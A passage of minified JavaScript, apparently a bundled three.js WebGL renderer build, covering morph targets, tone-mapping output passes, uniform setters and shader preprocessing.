H=X*b;_===!0&&(s.fromBufferAttribute(z,X),R[$+H+0]=s.x,R[$+H+1]=s.y,R[$+H+2]=s.z,R[$+H+3]=0),y===!0&&(s.fromBufferAttribute(V,X),R[$+H+4]=s.x,R[$+H+5]=s.y,R[$+H+6]=s.z,R[$+H+7]=0),m===!0&&(s.fromBufferAttribute(Z,X),R[$+H+8]=s.x,R[$+H+9]=s.y,R[$+H+10]=s.z,R[$+H+11]=Z.itemSize===4?s.w:1)}}h={count:p,texture:N,size:new et(T,A)},i.set(o,h),o.addEventListener("dispose",w)}if(a.isInstancedMesh===!0&&a.morphTexture!==null)l.getUniforms().setValue(t,"morphTexture",a.morphTexture,n);else{let _=0;for(let m=0;m<c.length;m++)_+=c[m];const y=o.morphTargetsRelative?1:1-_;l.getUniforms().setValue(t,"morphTargetBaseInfluence",y),l.getUniforms().setValue(t,"morphTargetInfluences",c)}l.getUniforms().setValue(t,"morphTargetsTexture",h.texture,n),l.getUniforms().setValue(t,"morphTargetsTextureSize",h.size)}return{update:r}}function iT(t,e,n,i){let s=new WeakMap;function r(l){const c=i.render.frame,d=l.geometry,p=e.get(l,d);if(s.get(p)!==c&&(e.update(p),s.set(p,c)),l.isInstancedMesh&&(l.hasEventListener("dispose",o)===!1&&l.addEventListener("dispose",o),s.get(l)!==c&&(n.update(l.instanceMatrix,t.ARRAY_BUFFER),l.instanceColor!==null&&n.update(l.instanceColor,t.ARRAY_BUFFER),s.set(l,c))),l.isSkinnedMesh){const h=l.skeleton;s.get(h)!==c&&(h.update(),s.set(h,c))}return p}function a(){s=new WeakMap}function o(l){const c=l.target;c.removeEventListener("dispose",o),n.remove(c.instanceMatrix),c.instanceColor!==null&&n.remove(c.instanceColor)}return{update:r,dispose:a}}const sT={[P0]:"LINEAR_TONE_MAPPING",[L0]:"REINHARD_TONE_MAPPING",[k0]:"CINEON_TONE_MAPPING",[N0]:"ACES_FILMIC_TONE_MAPPING",[I0]:"AGX_TONE_MAPPING",[U0]:"NEUTRAL_TONE_MAPPING",[D0]:"CUSTOM_TONE_MAPPING"};function rT(t,e,n,i,s){const r=new ai(e,n,{type:t,depthBuffer:i,stencilBuffer:s}),a=new ai(e,n,{type:Li,depthBuffer:!1,stencilBuffer:!1}),o=new An;o.setAttribute("position",new kt([-1,3,0,-1,-1,0,3,-1,0],3)),o.setAttribute("uv",new kt([0,2,0,0,2,0],2));const l=new Zw({uniforms:{tDiffuse:{value:null}},vertexShader:`
			precision highp float;

			uniform mat4 modelViewMatrix;
			uniform mat4 projectionMatrix;

			attribute vec3 position;
			attribute vec2 uv;

			varying vec2 vUv;

			void main() {
				vUv = uv;
				gl_Position = projectionMatrix * modelViewMatrix * vec4( position, 1.0 );
			}`,fragmentShader:`
			precision highp float;

			uniform sampler2D tDiffuse;

			varying vec2 vUv;

			#include <tonemapping_pars_fragment>
			#include <colorspace_pars_fragment>

			void main() {
				gl_FragColor = texture2D( tDiffuse, vUv );

				#ifdef LINEAR_TONE_MAPPING
					gl_FragColor.rgb = LinearToneMapping( gl_FragColor.rgb );
				#elif defined( REINHARD_TONE_MAPPING )
					gl_FragColor.rgb = ReinhardToneMapping( gl_FragColor.rgb );
				#elif defined( CINEON_TONE_MAPPING )
					gl_FragColor.rgb = CineonToneMapping( gl_FragColor.rgb );
				#elif defined( ACES_FILMIC_TONE_MAPPING )
					gl_FragColor.rgb = ACESFilmicToneMapping( gl_FragColor.rgb );
				#elif defined( AGX_TONE_MAPPING )
					gl_FragColor.rgb = AgXToneMapping( gl_FragColor.rgb );
				#elif defined( NEUTRAL_TONE_MAPPING )
					gl_FragColor.rgb = NeutralToneMapping( gl_FragColor.rgb );
				#elif defined( CUSTOM_TONE_MAPPING )
					gl_FragColor.rgb = CustomToneMapping( gl_FragColor.rgb );
				#endif

				#ifdef SRGB_TRANSFER
					gl_FragColor = sRGBTransferOETF( gl_FragColor );
				#endif
			}`,depthTest:!1,depthWrite:!1}),c=new Ot(o,l),d=new xh(-1,1,1,-1,0,1);let p=null,h=null,f=!1,_,y=null,m=[],u=!1;this.setSize=function(g,x){r.setSize(g,x),a.setSize(g,x);for(let S=0;S<m.length;S++){const T=m[S];T.setSize&&T.setSize(g,x)}},this.setEffects=function(g){m=g,u=m.length>0&&m[0].isRenderPass===!0;const x=r.width,S=r.height;for(let T=0;T<m.length;T++){const A=m[T];A.setSize&&A.setSize(x,S)}},this.begin=function(g,x){if(f||g.toneMapping===ri&&m.length===0)return!1;if(y=x,x!==null){const S=x.width,T=x.height;(r.width!==S||r.height!==T)&&this.setSize(S,T)}return u===!1&&g.setRenderTarget(r),_=g.toneMapping,g.toneMapping=ri,!0},this.hasRenderPass=function(){return u},this.end=function(g,x){g.toneMapping=_,f=!0;let S=r,T=a;for(let A=0;A<m.length;A++){const R=m[A];if(R.enabled!==!1&&(R.render(g,T,S,x),R.needsSwap!==!1)){const N=S;S=T,T=N}}if(p!==g.outputColorSpace||h!==g.toneMapping){p=g.outputColorSpace,h=g.toneMapping,l.defines={},Ye.getTransfer(p)===st&&(l.defines.SRGB_TRANSFER="");const A=sT[h];A&&(l.defines[A]=""),l.needsUpdate=!0}l.uniforms.tDiffuse.value=S.texture,g.setRenderTarget(y),g.render(c,d),y=null,f=!1},this.isCompositing=function(){return f},this.dispose=function(){r.dispose(),a.dispose(),o.dispose(),l.dispose()}}const p_=new Zt,ap=new Ya(1,1),h_=new q0,f_=new Ew,m_=new t_,Nm=[],Dm=[],Im=new Float32Array(16),Um=new Float32Array(9),Om=new Float32Array(4);function jr(t,e,n){const i=t[0];if(i<=0||i>0)return t;const s=e*n;let r=Nm[s];if(r===void 0&&(r=new Float32Array(s),Nm[s]=r),e!==0){i.toArray(r,0);for(let a=1,o=0;a!==e;++a)o+=n,t[a].toArray(r,o)}return r}function Nt(t,e){if(t.length!==e.length)return!1;for(let n=0,i=t.length;n<i;n++)if(t[n]!==e[n])return!1;return!0}function Dt(t,e){for(let n=0,i=e.length;n<i;n++)t[n]=e[n]}function cc(t,e){let n=Dm[e];n===void 0&&(n=new Int32Array(e),Dm[e]=n);for(let i=0;i!==e;++i)n[i]=t.allocateTextureUnit();return n}function aT(t,e){const n=this.cache;n[0]!==e&&(t.uniform1f(this.addr,e),n[0]=e)}function oT(t,e){const n=this.cache;if(e.x!==void 0)(n[0]!==e.x||n[1]!==e.y)&&(t.uniform2f(this.addr,e.x,e.y),n[0]=e.x,n[1]=e.y);else{if(Nt(n,e))return;t.uniform2fv(this.addr,e),Dt(n,e)}}function lT(t,e){const n=this.cache;if(e.x!==void 0)(n[0]!==e.x||n[1]!==e.y||n[2]!==e.z)&&(t.uniform3f(this.addr,e.x,e.y,e.z),n[0]=e.x,n[1]=e.y,n[2]=e.z);else if(e.r!==void 0)(n[0]!==e.r||n[1]!==e.g||n[2]!==e.b)&&(t.uniform3f(this.addr,e.r,e.g,e.b),n[0]=e.r,n[1]=e.g,n[2]=e.b);else{if(Nt(n,e))return;t.uniform3fv(this.addr,e),Dt(n,e)}}function cT(t,e){const n=this.cache;if(e.x!==void 0)(n[0]!==e.x||n[1]!==e.y||n[2]!==e.z||n[3]!==e.w)&&(t.uniform4f(this.addr,e.x,e.y,e.z,e.w),n[0]=e.x,n[1]=e.y,n[2]=e.z,n[3]=e.w);else{if(Nt(n,e))return;t.uniform4fv(this.addr,e),Dt(n,e)}}function uT(t,e){const n=this.cache,i=e.elements;if(i===void 0){if(Nt(n,e))return;t.uniformMatrix2fv(this.addr,!1,e),Dt(n,e)}else{if(Nt(n,i))return;Om.set(i),t.uniformMatrix2fv(this.addr,!1,Om),Dt(n,i)}}function dT(t,e){const n=this.cache,i=e.elements;if(i===void 0){if(Nt(n,e))return;t.uniformMatrix3fv(this.addr,!1,e),Dt(n,e)}else{if(Nt(n,i))return;Um.set(i),t.uniformMatrix3fv(this.addr,!1,Um),Dt(n,i)}}function pT(t,e){const n=this.cache,i=e.elements;if(i===void 0){if(Nt(n,e))return;t.uniformMatrix4fv(this.addr,!1,e),Dt(n,e)}else{if(Nt(n,i))return;Im.set(i),t.uniformMatrix4fv(this.addr,!1,Im),Dt(n,i)}}function hT(t,e){const n=this.cache;n[0]!==e&&(t.uniform1i(this.addr,e),n[0]=e)}function fT(t,e){const n=this.cache;if(e.x!==void 0)(n[0]!==e.x||n[1]!==e.y)&&(t.uniform2i(this.addr,e.x,e.y),n[0]=e.x,n[1]=e.y);else{if(Nt(n,e))return;t.uniform2iv(this.addr,e),Dt(n,e)}}function mT(t,e){const n=this.cache;if(e.x!==void 0)(n[0]!==e.x||n[1]!==e.y||n[2]!==e.z)&&(t.uniform3i(this.addr,e.x,e.y,e.z),n[0]=e.x,n[1]=e.y,n[2]=e.z);else{if(Nt(n,e))return;t.uniform3iv(this.addr,e),Dt(n,e)}}function gT(t,e){const n=this.cache;if(e.x!==void 0)(n[0]!==e.x||n[1]!==e.y||n[2]!==e.z||n[3]!==e.w)&&(t.uniform4i(this.addr,e.x,e.y,e.z,e.w),n[0]=e.x,n[1]=e.y,n[2]=e.z,n[3]=e.w);else{if(Nt(n,e))return;t.uniform4iv(this.addr,e),Dt(n,e)}}function vT(t,e){const n=this.cache;n[0]!==e&&(t.uniform1ui(this.addr,e),n[0]=e)}function _T(t,e){const n=this.cache;if(e.x!==void 0)(n[0]!==e.x||n[1]!==e.y)&&(t.uniform2ui(this.addr,e.x,e.y),n[0]=e.x,n[1]=e.y);else{if(Nt(n,e))return;t.uniform2uiv(this.addr,e),Dt(n,e)}}function xT(t,e){const n=this.cache;if(e.x!==void 0)(n[0]!==e.x||n[1]!==e.y||n[2]!==e.z)&&(t.uniform3ui(this.addr,e.x,e.y,e.z),n[0]=e.x,n[1]=e.y,n[2]=e.z);else{if(Nt(n,e))return;t.uniform3uiv(this.addr,e),Dt(n,e)}}function yT(t,e){const n=this.cache;if(e.x!==void 0)(n[0]!==e.x||n[1]!==e.y||n[2]!==e.z||n[3]!==e.w)&&(t.uniform4ui(this.addr,e.x,e.y,e.z,e.w),n[0]=e.x,n[1]=e.y,n[2]=e.z,n[3]=e.w);else{if(Nt(n,e))return;t.uniform4uiv(this.addr,e),Dt(n,e)}}function ST(t,e,n){const i=this.cache,s=n.allocateTextureUnit();i[0]!==s&&(t.uniform1i(this.addr,s),i[0]=s);let r;this.type===t.SAMPLER_2D_SHADOW?(ap.compareFunction=n.isReversedDepthBuffer()?hh:ph,r=ap):r=p_,n.setTexture2D(e||r,s)}function bT(t,e,n){const i=this.cache,s=n.allocateTextureUnit();i[0]!==s&&(t.uniform1i(this.addr,s),i[0]=s),n.setTexture3D(e||f_,s)}function wT(t,e,n){const i=this.cache,s=n.allocateTextureUnit();i[0]!==s&&(t.uniform1i(this.addr,s),i[0]=s),n.setTextureCube(e||m_,s)}function MT(t,e,n){const i=this.cache,s=n.allocateTextureUnit();i[0]!==s&&(t.uniform1i(this.addr,s),i[0]=s),n.setTexture2DArray(e||h_,s)}function ET(t){switch(t){case 5126:return aT;case 35664:return oT;case 35665:return lT;case 35666:return cT;case 35674:return uT;case 35675:return dT;case 35676:return pT;case 5124:case 35670:return hT;case 35667:case 35671:return fT;case 35668:case 35672:return mT;case 35669:case 35673:return gT;case 5125:return vT;case 36294:return _T;case 36295:return xT;case 36296:return yT;case 35678:case 36198:case 36298:case 36306:case 35682:return ST;case 35679:case 36299:case 36307:return bT;case 35680:case 36300:case 36308:case 36293:return wT;case 36289:case 36303:case 36311:case 36292:return MT}}function TT(t,e){t.uniform1fv(this.addr,e)}function AT(t,e){const n=jr(e,this.size,2);t.uniform2fv(this.addr,n)}function CT(t,e){const n=jr(e,this.size,3);t.uniform3fv(this.addr,n)}function RT(t,e){const n=jr(e,this.size,4);t.uniform4fv(this.addr,n)}function PT(t,e){const n=jr(e,this.size,4);t.uniformMatrix2fv(this.addr,!1,n)}function LT(t,e){const n=jr(e,this.size,9);t.uniformMatrix3fv(this.addr,!1,n)}function kT(t,e){const n=jr(e,this.size,16);t.uniformMatrix4fv(this.addr,!1,n)}function NT(t,e){t.uniform1iv(this.addr,e)}function DT(t,e){t.uniform2iv(this.addr,e)}function IT(t,e){t.uniform3iv(this.addr,e)}function UT(t,e){t.uniform4iv(this.addr,e)}function OT(t,e){t.uniform1uiv(this.addr,e)}function FT(t,e){t.uniform2uiv(this.addr,e)}function BT(t,e){t.uniform3uiv(this.addr,e)}function zT(t,e){t.uniform4uiv(this.addr,e)}function VT(t,e,n){const i=this.cache,s=e.length,r=cc(n,s);Nt(i,r)||(t.uniform1iv(this.addr,r),Dt(i,r));let a;this.type===t.SAMPLER_2D_SHADOW?a=ap:a=p_;for(let o=0;o!==s;++o)n.setTexture2D(e[o]||a,r[o])}function HT(t,e,n){const i=this.cache,s=e.length,r=cc(n,s);Nt(i,r)||(t.uniform1iv(this.addr,r),Dt(i,r));for(let a=0;a!==s;++a)n.setTexture3D(e[a]||f_,r[a])}function GT(t,e,n){const i=this.cache,s=e.length,r=cc(n,s);Nt(i,r)||(t.uniform1iv(this.addr,r),Dt(i,r));for(let a=0;a!==s;++a)n.setTextureCube(e[a]||m_,r[a])}function WT(t,e,n){const i=this.cache,s=e.length,r=cc(n,s);Nt(i,r)||(t.uniform1iv(this.addr,r),Dt(i,r));for(let a=0;a!==s;++a)n.setTexture2DArray(e[a]||h_,r[a])}function jT(t){switch(t){case 5126:return TT;case 35664:return AT;case 35665:return CT;case 35666:return RT;case 35674:return PT;case 35675:return LT;case 35676:return kT;case 5124:case 35670:return NT;case 35667:case 35671:return DT;case 35668:case 35672:return IT;case 35669:case 35673:return UT;case 5125:return OT;case 36294:return FT;case 36295:return BT;case 36296:return zT;case 35678:case 36198:case 36298:case 36306:case 35682:return VT;case 35679:case 36299:case 36307:return HT;case 35680:case 36300:case 36308:case 36293:return GT;case 36289:case 36303:case 36311:case 36292:return WT}}class XT{constructor(e,n,i){this.id=e,this.addr=i,this.cache=[],this.type=n.type,this.setValue=ET(n.type)}}class qT{constructor(e,n,i){this.id=e,this.addr=i,this.cache=[],this.type=n.type,this.size=n.size,this.setValue=jT(n.type)}}class YT{constructor(e){this.id=e,this.seq=[],this.map={}}setValue(e,n,i){const s=this.seq;for(let r=0,a=s.length;r!==a;++r){const o=s[r];o.setValue(e,n[o.id],i)}}}const vu=/(\w+)(\])?(\[|\.)?/g;function Fm(t,e){t.seq.push(e),t.map[e.id]=e}function $T(t,e,n){const i=t.name,s=i.length;for(vu.lastIndex=0;;){const r=vu.exec(i),a=vu.lastIndex;let o=r[1];const l=r[2]==="]",c=r[3];if(l&&(o=o|0),c===void 0||c==="["&&a+2===s){Fm(n,c===void 0?new XT(o,t,e):new qT(o,t,e));break}else{let p=n.map[o];p===void 0&&(p=new YT(o),Fm(n,p)),n=p}}}class pl{constructor(e,n){this.seq=[],this.map={};const i=e.getProgramParameter(n,e.ACTIVE_UNIFORMS);for(let a=0;a<i;++a){const o=e.getActiveUniform(n,a),l=e.getUniformLocation(n,o.name);$T(o,l,this)}const s=[],r=[];for(const a of this.seq)a.type===e.SAMPLER_2D_SHADOW||a.type===e.SAMPLER_CUBE_SHADOW||a.type===e.SAMPLER_2D_ARRAY_SHADOW?s.push(a):r.push(a);s.length>0&&(this.seq=s.concat(r))}setValue(e,n,i,s){const r=this.map[n];r!==void 0&&r.setValue(e,i,s)}setOptional(e,n,i){const s=n[i];s!==void 0&&this.setValue(e,i,s)}static upload(e,n,i,s){for(let r=0,a=n.length;r!==a;++r){const o=n[r],l=i[o.id];l.needsUpdate!==!1&&o.setValue(e,l.value,s)}}static seqWithValue(e,n){const i=[];for(let s=0,r=e.length;s!==r;++s){const a=e[s];a.id in n&&i.push(a)}return i}}function Bm(t,e,n){const i=t.createShader(e);return t.shaderSource(i,n),t.compileShader(i),i}const KT=37297;let ZT=0;function JT(t,e){const n=t.split(`
`),i=[],s=Math.max(e-6,0),r=Math.min(e+6,n.length);for(let a=s;a<r;a++){const o=a+1;i.push(`${o===e?">":" "} ${o}: ${n[a]}`)}return i.join(`
`)}const zm=new Fe;function QT(t){Ye._getMatrix(zm,Ye.workingColorSpace,t);const e=`mat3( ${zm.elements.map(n=>n.toFixed(4))} )`;switch(Ye.getTransfer(t)){case Fl:return[e,"LinearTransferOETF"];case st:return[e,"sRGBTransferOETF"];default:return Ne("WebGLProgram: Unsupported color space: ",t),[e,"LinearTransferOETF"]}}function Vm(t,e,n){const i=t.getShaderParameter(e,t.COMPILE_STATUS),r=(t.getShaderInfoLog(e)||"").trim();if(i&&r==="")return"";const a=/ERROR: 0:(\d+)/.exec(r);if(a){const o=parseInt(a[1]);return n.toUpperCase()+`

`+r+`

`+JT(t.getShaderSource(e),o)}else return r}function eA(t,e){const n=QT(e);return[`vec4 ${t}( vec4 value ) {`,`	return ${n[1]}( vec4( value.rgb * ${n[0]}, value.a ) );`,"}"].join(`
`)}const tA={[P0]:"Linear",[L0]:"Reinhard",[k0]:"Cineon",[N0]:"ACESFilmic",[I0]:"AgX",[U0]:"Neutral",[D0]:"Custom"};function nA(t,e){const n=tA[e];return n===void 0?(Ne("WebGLProgram: Unsupported toneMapping:",e),"vec3 "+t+"( vec3 color ) { return LinearToneMapping( color ); }"):"vec3 "+t+"( vec3 color ) { return "+n+"ToneMapping( color ); }"}const Yo=new B;function iA(){Ye.getLuminanceCoefficients(Yo);const t=Yo.x.toFixed(4),e=Yo.y.toFixed(4),n=Yo.z.toFixed(4);return["float luminance( const in vec3 rgb ) {",`	const vec3 weights = vec3( ${t}, ${e}, ${n} );`,"	return dot( weights, rgb );","}"].join(`
`)}function sA(t){return[t.extensionClipCullDistance?"#extension GL_ANGLE_clip_cull_distance : require":"",t.extensionMultiDraw?"#extension GL_ANGLE_multi_draw : require":""].filter(fa).join(`
`)}function rA(t){const e=[];for(const n in t){const i=t[n];i!==!1&&e.push("#define "+n+" "+i)}return e.join(`
`)}function aA(t,e){const n={},i=t.getProgramParameter(e,t.ACTIVE_ATTRIBUTES);for(let s=0;s<i;s++){const r=t.getActiveAttrib(e,s),a=r.name;let o=1;r.type===t.FLOAT_MAT2&&(o=2),r.type===t.FLOAT_MAT3&&(o=3),r.type===t.FLOAT_MAT4&&(o=4),n[a]={type:r.type,location:t.getAttribLocation(e,a),locationSize:o}}return n}function fa(t){return t!==""}function Hm(t,e){const n=e.numSpotLightShadows+e.numSpotLightMaps-e.numSpotLightShadowsWithMaps;return t.replace(/NUM_DIR_LIGHTS/g,e.numDirLights).replace(/NUM_SPOT_LIGHTS/g,e.numSpotLights).replace(/NUM_SPOT_LIGHT_MAPS/g,e.numSpotLightMaps).replace(/NUM_SPOT_LIGHT_COORDS/g,n).replace(/NUM_RECT_AREA_LIGHTS/g,e.numRectAreaLights).replace(/NUM_POINT_LIGHTS/g,e.numPointLights).replace(/NUM_HEMI_LIGHTS/g,e.numHemiLights).replace(/NUM_DIR_LIGHT_SHADOWS/g,e.numDirLightShadows).replace(/NUM_SPOT_LIGHT_SHADOWS_WITH_MAPS/g,e.numSpotLightShadowsWithMaps).replace(/NUM_SPOT_LIGHT_SHADOWS/g,e.numSpotLightShadows).replace(/NUM_POINT_LIGHT_SHADOWS/g,e.numPointLightShadows)}function Gm(t,e){return t.replace(/NUM_CLIPPING_PLANES/g,e.numClippingPlanes).replace(/UNION_CLIPPING_PLANES/g,e.numClippingPlanes-e.numClipIntersection)}const oA=/^[ \t]*#include +<([\w\d./]+)>/gm;function op(t){return t.replace(oA,cA)}const lA=new Map;function cA(t,e){let n=Be[e];if(n===void 0){const i=lA.get(e);if(i!==void 0)n=Be[i],Ne('WebGLRenderer: Shader chunk "%s" has been deprecated. Use "%s" instead.',e,i);else throw new Error("Can not resolve #include <"+e+">")}return op(n)}const uA=/#pragma unroll_loop_start\s+for\s*\(\s*int\s+i\s*=\s*(\d+)\s*;\s*i\s*<\s*(\d+)\s*;\s*i\s*\+\+\s*\)\s*{([\s\S]+?)}\s+#pragma unroll_loop_end/g;function Wm(t){return t.replace(uA,dA)}function dA(t,e,n,i){let s="";for(let r=parseInt(e);r<parseInt(n);r++)s+=i.replace(/\[\s*i\s*\]/g,"[ "+r+" ]").replace(/UNROLLED_LOOP_INDEX/g,r);return s}function jm(t){let e=`precision ${t.precision} float;
	precision ${t.precision} int;
	precision ${t.precision} sampler2D;
	precision ${t.precision} samplerCube;
	precision ${t.precision} sampler3D;
	precision ${t.precision} sampler2DArray;
	precision ${t.precision} sampler2DShadow;
	precision ${t.precision} samplerCubeShadow;
	precision ${t.precision} sampler2DArrayShadow;
	precision ${t.precision} isampler2D;
	precision ${t.precision} isampler3D;
	precision ${t.precision} isamplerCube;
	precision ${t.precision} isampler2DArray;
	precision ${t.precision} usampler2D;
	precision ${t.precision} usampler3D;
	precision ${t.precision} usamplerCube;
	precision ${t.precision} usampler2DArray;
	`;return t.precision==="highp"?e+=`
#define HIGH_PRECISION`:t.precision==="mediump"?e+=`
#define MEDIUM_PRECISION`:t.precision==="lowp"&&(e+=`
#define LOW_PRECISION`),e}const pA={[ol]:"SHADOWMAP_TYPE_PCF",[ha]:"SHADOWMAP_TYPE_VSM"};function hA(t){return pA[t.shadowMapType]||"SHADOWMAP_TYPE_BASIC"}const fA={[zs]:"ENVMAP_TYPE_CUBE",[Ir]:"ENVMAP_TYPE_CUBE",[ac]:"ENVMAP_TYPE_CUBE_UV"};function mA(t){return t.envMap===!1?"ENVMAP_TYPE_CUBE":fA[t.envMapMode]||"ENVMAP_TYPE_CUBE"}const gA={[Ir]:"ENVMAP_MODE_REFRACTION"};function vA(t){return t.envMap===!1?"ENVMAP_MODE_REFLECTION":gA[t.envMapMode]||"ENVMAP_MODE_REFLECTION"}const _A={[R0]:"ENVMAP_BLENDING_MULTIPLY",[aw]:"ENVMAP_BLENDING_MIX",[ow]:"ENVMAP_BLENDING_ADD"};function xA(t){return t.envMap===!1?"ENVMAP_BLENDING_NONE":_A[t.combine]||"ENVMAP_BLENDING_NONE"}function yA(t){const e=t.envMapCubeUVHeight;if(e===null)return null;const n=Math.log2(e)-2,i=1/e;return{texelWidth:1/(3*Math.max(Math.pow(2,n),7*16)),texelHeight:i,maxMip:n}}function SA(t,e,n,i){const s=t.getContext(),r=n.defines;let a=n.vertexShader,o=n.fragmentShader;const l=hA(n),c=mA(n),d=vA(n),p=xA(n),h=yA(n),f=sA(n),_=rA(r),y=s.createProgram();let m,u,g=n.glslVersion?"#version "+n.glslVersion+`
`:"";n.isRawShaderMaterial?(m=["#define SHADER_TYPE "+n.shaderType,"#define SHADER_NAME "+n.shaderName,_].filter(fa).join(`
`),m.length>0&&(m+=`
`),u=["#define SHADER_TYPE "+n.shaderType,"#define SHADER_NAME "+n.shaderName,_].filter(fa).join(`
`),u.length>0&&(u+=`
`)):(m=[jm(n),"#define SHADER_TYPE "+n.shaderType,"#define SHADER_NAME "+n.shaderName,_,n.extensionClipCullDistance?"#define USE_CLIP_DISTANCE":"",n.batching?"#define USE_BATCHING":"",n.batchingColor?"#define USE_BATCHING_COLOR":"",n.instancing?"#define USE_INSTANCING":"",n.instancingColor?"#define USE_INSTANCING_COLOR":"",n.instancingMorph?"#define USE_INSTANCING_MORPH":"",n.useFog&&n.fog?"#define USE_FOG":"",n.useFog&&n.fogExp2?"#define FOG_EXP2":"",n.map?"#define USE_MAP":"",n.envMap?"#define USE_ENVMAP":"",n.envMap?"#define "+d:"",n.lightMap?"#define USE_LIGHTMAP":"",n.aoMap?"#define USE_AOMAP":"",n.bumpMap?"#define USE_BUMPMAP":"",n.normalMap?"#define USE_NORMALMAP":"",n.normalMapObjectSpace?"#define USE_NORMALMAP_OBJECTSPACE":"",n.normalMapTangentSpace?"#define USE_NORMALMAP_TANGENTSPACE":"",n.displacementMap?"#define USE_DISPLACEMENTMAP":"",n.emissiveMap?"#define USE_EMISSIVEMAP":"",n.anisotropy?"#define USE_ANISOTROPY":"",n.anisotropyMap?"#define USE_ANISOTROPYMAP":"",n.clearcoatMap?"#define USE_CLEARCOATMAP":"",n.clearcoatRoughnessMap?"#define USE_CLEARCOAT_ROUGHNESSMAP":"",n.clearcoatNormalMap?"#define USE_CLEARCOAT_NORMALMAP":"",n.iridescenceMap?"#define USE_IRIDESCENCEMAP":"",n.iridescenceThicknessMap?"#define USE_IRIDESCENCE_THICKNESSMAP":"",n.specularMap?"#define USE_SPECULARMAP":"",n.specularColorMap?"#define USE_SPECULAR_COLORMAP":"",n.specularIntensityMap?"#define USE_SPECULAR_INTENSITYMAP":"",n.roughnessMap?"#define USE_ROUGHNESSMAP":"",n.metalnessMap?"#define USE_METALNESSMAP":"",n.alphaMap?"#define USE_ALPHAMAP":"",n.alphaHash?"#define USE_ALPHAHASH":"",n.transmission?"#define USE_TRANSMISSION":"",n.transmissionMap?"#define USE_TRANSMISSIONMAP":"",n.thicknessMap?"#define USE_THICKNESSMAP":"",n.sheenColorMap?"#define USE_SHEEN_COLORMAP":"",n.sheenRoughnessMap?"#define USE_SHEEN_ROUGHNESSMAP":"",n.mapUv?"#define MAP_UV "+n.mapUv:"",n.alphaMapUv?"#define ALPHAMAP_UV "+n.alphaMapUv:"",n.lightMapUv?"#define LIGHTMAP_UV "+n.lightMapUv:"",n.aoMapUv?"#define AOMAP_UV "+n.aoMapUv:"",n.emissiveMapUv?"#define EMISSIVEMAP_UV "+n.emissiveMapUv:"",n.bumpMapUv?"#define BUMPMAP_UV "+n.bumpMapUv:"",n.normalMapUv?"#define NORMALMAP_UV "+n.normalMapUv:"",n.displacementMapUv?"#define DISPLACEMENTMAP_UV "+n.displacementMapUv:"",n.metalnessMapUv?"#define METALNESSMAP_UV "+n.metalnessMapUv:"",n.roughnessMapUv?"#define ROUGHNESSMAP_UV "+n.roughnessMapUv:"",n.anisotropyMapUv?"#define ANISOTROPYMAP_UV "+n.anisotropyMapUv:"",n.clearcoatMapUv?"#define CLEARCOATMAP_UV "+n.clearcoatMapUv:"",n.clearcoatNormalMapUv?"#define CLEARCOAT_NORMALMAP_UV "+n.clearcoatNormalMapUv:"",n.clearcoatRoughnessMapUv?"#define CLEARCOAT_ROUGHNESSMAP_UV "+n.clearcoatRoughnessMapUv:"",n.iridescenceMapUv?"#define IRIDESCENCEMAP_UV "+n.iridescenceMapUv:"",n.iridescenceThicknessMapUv?"#define IRIDESCENCE_THICKNESSMAP_UV "+n.iridescenceThicknessMapUv:"",n.sheenColorMapUv?"#define SHEEN_COLORMAP_UV "+n.sheenColorMapUv:"",n.sheenRoughnessMapUv?"#define SHEEN_ROUGHNESSMAP_UV "+n.sheenRoughnessMapUv:"",n.specularMapUv?"#define SPECULARMAP_UV "+n.specularMapUv:"",n.specularColorMapUv?"#define SPECULAR_COLORMAP_UV "+n.specularColorMapUv:"",n.specularIntensityMapUv?"#define SPECULAR_INTENSITYMAP_UV "+n.specularIntensityMapUv:"",n.transmissionMapUv?"#define TRANSMISSIONMAP_UV "+n.transmissionMapUv:"",n.thicknessMapUv?"#define THICKNESSMAP_UV "+n.thicknessMapUv:"",n.vertexTangents&&n.flatShading===!1?"#define USE_TANGENT":"",n.vertexColors?"#define USE_COLOR":"",n.vertexAlphas?"#define USE_COLOR_ALPHA":"",n.vertexUv1s?"#define USE_UV1":"",n.vertexUv2s?"#define USE_UV2":"",n.vertexUv3s?"#define USE_UV3":"",n.pointsUvs?"#define USE_POINTS_UV":"",n.flatShading?"#define FLAT_SHADED":"",n.skinning?"#define USE_SKINNING":"",n.morphTargets?"#define USE_MORPHTARGETS":"",n.morphNormals&&n.flatShading===!1?"#define USE_MORPHNORMALS":"",n.morphColors?"#define USE_MORPHCOLORS":"",n.morphTargetsCount>0?"#define MORPHTARGETS_TEXTURE_STRIDE "+n.morphTextureStride:"",n.morphTargetsCount>0?"#define MORPHTARGETS_COUNT "+n.morphTargetsCount:"",n.doubleSided?"#define DOUBLE_SIDED":"",n.flipSided?"#define FLIP_SIDED":"",n.shadowMapEnabled?"#define USE_SHADOWMAP":"",n.shadowMapEnabled?"#define "+l:"",n.sizeAttenuation?"#define USE_SIZEATTENUATION":"",n.numLightProbes>0?"#define USE_LIGHT_PROBES":"",n.logarithmicDepthBuffer?"#define USE_LOGARITHMIC_DEPTH_BUFFER":"",n.reversedDepthBuffer?"#define USE_REVERSED_DEPTH_BUFFER":"","uniform mat4 modelMatrix;","uniform mat4 modelViewMatrix;","uniform mat4 projectionMatrix;","uniform mat4 viewMatrix;","uniform mat3 normalMatrix;","uniform vec3 cameraPosition;","uniform bool isOrthographic;","#ifdef USE_INSTANCING","	attribute mat4 instanceMatrix;","#endif","#ifdef USE_INSTANCING_COLOR","	attribute vec3 instanceColor;","#endif","#ifdef USE_INSTANCING_MORPH","	uniform sampler2D morphTexture;","#endif","attribute vec3 position;","attribute vec3 normal;","attribute vec2 uv;","#ifdef USE_UV1","	attribute vec2 uv1;","#endif","#ifdef USE_UV2","	attribute vec2 uv2;","#endif","#ifdef USE_UV3","	attribute vec2 uv3;","#endif","#ifdef USE_TANGENT","	attribute vec4 tangent;","#endif","#if defined( USE_COLOR_ALPHA )","	attribute vec4 color;","#elif defined( USE_COLOR )","	attribute vec3 color;","#endif","#ifdef USE_SKINNING","	attribute vec4 skinIndex;","	attribute vec4 skinWeight;","#endif",`
`].filter(fa).join(`
